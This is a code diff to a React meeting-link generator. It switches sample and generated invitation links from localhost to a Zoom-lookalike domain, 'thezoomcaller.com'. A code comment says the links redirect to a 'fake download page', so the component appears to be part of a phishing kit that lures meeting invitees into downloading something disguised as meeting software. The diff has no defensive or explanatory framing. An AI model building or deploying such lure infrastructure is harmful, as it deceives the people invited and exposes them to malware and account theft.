@@ -36,7 +36,7 @@ const MeetingLinkGenerator: React.FC = () => {
       id: '1',
       title: 'Team Meeting - Q4 Planning',
       description: 'Quarterly planning session for all departments',
-      link: 'http://localhost:3000/meeting/j/123456789',
+      link: 'https://thezoomcaller.com/meeting/j/123456789',
       createdAt: '2024-07-20T10:00:00Z',
       expiresAt: '2024-07-27T10:00:00Z',
       maxParticipants: 50,
@@ -48,7 +48,7 @@ const MeetingLinkGenerator: React.FC = () => {
       id: '2',
       title: 'Client Presentation',
       description: 'Product demo for potential client',
-      link: 'http://localhost:3000/meeting/j/987654321',
+      link: 'https://thezoomcaller.com/meeting/j/987654321',
       createdAt: '2024-07-19T15:00:00Z',
       maxParticipants: 10,
       isActive: true,
@@ -59,7 +59,7 @@ const MeetingLinkGenerator: React.FC = () => {
       id: '3',
       title: 'All Hands Meeting',
       description: 'Monthly company-wide meeting',
-      link: 'http://localhost:3000/meeting/j/456789123',
+      link: 'https://thezoomcaller.com/meeting/j/456789123',
       createdAt: '2024-07-18T09:00:00Z',
       expiresAt: '2024-07-25T09:00:00Z',
       maxParticipants: 200,
@@ -79,8 +79,8 @@ const MeetingLinkGenerator: React.FC = () => {
 
   const generateMeetingLink = () => {
     const meetingId = Math.random().toString(36).substring(2, 15);
-    // Use your localhost domain to redirect to your fake download page
-    return `http://localhost:3000/meeting/j/${meetingId}`;
+    // Use your custom domain to redirect to your fake download page
+    return `https://thezoomcaller.com/meeting/j/${meetingId}`;
   };
 
   const createMeetingLink = async () => {
